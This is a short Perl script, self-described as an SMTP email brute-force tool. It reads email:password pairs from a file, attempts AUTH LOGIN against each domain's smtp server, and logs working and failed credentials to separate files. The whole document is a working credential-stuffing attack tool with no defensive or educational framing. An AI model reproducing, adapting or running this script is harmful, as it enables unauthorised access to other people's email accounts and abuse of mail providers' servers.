# this sample exists in a multiple version
# product a sample brute force for smtp
# IO::Socket::SSL not a treads safe
#!/usr/bin/perl

use IO::Socket;
use MIME::base64;
use threads;
use threads::shared;
use Fcntl ':flock';
############################
my $threads = 1;           # 
my $acc_file = 'accs.txt'; #
my $good = 'good.txt';     # 
my $bad = 'bad.txt';       # 
my $acc_delm = ':';        # 
my $port = 25;             # 
my $timeout = 15;          # 
############################
system('title SMTP email brute');
my @accs : shared = lf($acc_file);
threads->new(\&main) for 1 .. $threads;
$_->join for threads->list;
sub main
{
    while(@accs)
    {
        my ($mail, $pass) = split $acc_delm => shift @accs;
        my ($login, $domain) = split '@' => $mail;
        my $passw = MIME::Base64::encode($pass);
        $login = MIME::Base64::encode($login);
        $passw =~ s,\n,,;
        $login =~ s,\n,,;
        my $sock = new IO::Socket::INET(PeerAddr  => 'smtp.'.$domain,
                                        PeerPort  => $port,
                                        PeerProto => 'tcp',
                                        TimeOut   => $timeout);
        sysread $sock, $answ, 1024;
        print $sock "AUTH LOGIN\r\n";
        sysread $sock, $answ, 1024;
        print $sock "$login\r\n";
        sysread $sock, $answ, 1024;
        print $sock "$passw\r\n";
        sysread $sock, $answ, 1024;
        close $sock;
        if($answ =~ m,Authentication succeeded,i)
        {
            print "[ + ] $mail:$pass\n";
            wf($good, "$mail:$pass\n");
        }
        else
        {
            print "[ - ] $mail:$pass\n";
            wf($bad, "$mail:$pass\n");
        }
    }
}
sub lf
{
    open my $dat, '< ', $_[0] or die "\nCould not open $_[0] file!\n";
    chomp(my @data = <$dat>);
    close $dat;
    return @data;
}
sub wf
{
    open my $dat, '>>', $_[0] or die "\nCould not open $_[0] file!\n";
    flock $dat, LOCK_EX;
    print $dat $_[1];
    flock $dat, LOCK_UN;
    close $dat;
}
